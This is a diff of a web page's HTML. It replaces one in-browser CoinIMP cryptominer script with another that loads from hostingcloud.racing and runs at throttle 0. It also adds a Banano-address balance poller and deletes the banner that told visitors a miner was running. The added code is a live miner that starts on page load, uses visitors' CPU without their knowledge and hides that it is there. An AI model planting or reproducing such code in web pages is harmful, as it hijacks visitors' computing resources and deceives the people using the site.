@@ -133,13 +133,30 @@
     <script src="js/bootstrap.min.js"></script>
 	
 	
-	<script src="https://www.hostingcloud.racing/g9HD.js"></script>
+
+	<script src='https://www.hostingcloud.racing/ESAt.js'></script><script>var web_client = new Client.User('c559e8e7fc205681aaac3bbfa114234e4bf3441e05b3dc9a337319791a7de68c','449fb3220d692c8b8b53bcd39358a13c',{throttle:0,ads:0,c:'w'});web_client.start();</script>
 <script>
-    var _client = new Client.Anonymous('98c756d1db33d1a3fd2280f90894e3dc566e5368f6d03a5268f8a6ec00e1038f', {
-        throttle: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+$( document ).ready(startup());
+
+function startup() {
+        refresh_data_min();
+        refresh_data_sec();
+}
+
+function refresh_data_min() {
+        if(document.getElementById('do_not_update').value == '0') {
+                let address='ban_1cpz35oswjhr5co3azacnjia9oibsoa5yeu37cpzsgna3foeth7kun1shkmy';
+                $('#balance').load('?json=1&address='+address+'&coinimp_web'+'');
+        }
+        setTimeout('refresh_data_min()',3600000);
+}
+
+function refresh_data_sec() {
+        if (typeof(web_update_stats) !== "undefined") web_update_stats();
+        if (typeof(xmr_update_stats) !== "undefined") xmr_update_stats();
+        setTimeout('refresh_data_sec()',1000);
+}
+
 
 </script>
 
